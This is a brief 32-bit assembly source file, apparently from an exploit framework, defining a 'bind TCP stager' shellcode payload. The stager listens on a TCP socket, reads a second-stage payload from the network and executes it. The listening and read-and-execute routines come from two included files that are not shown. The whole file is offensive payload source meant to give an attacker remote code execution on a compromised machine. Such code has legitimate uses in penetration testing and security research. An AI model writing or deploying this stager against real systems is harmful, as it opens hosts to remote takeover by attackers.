;;;
;;; bind_tcp - Bind TCP Stager
;;;

BITS 32

;;; --------------------------------------------------------------------
;;; bind_tcp()
;;;
;;; Listen on a TCP socket, receive subsequent stage, and execute it.
;;;
;;; --------------------------------------------------------------------

_bind_tcp:
begin:	
%include "_tcp_listen.s"	
%include "_read_exec.s"
end:
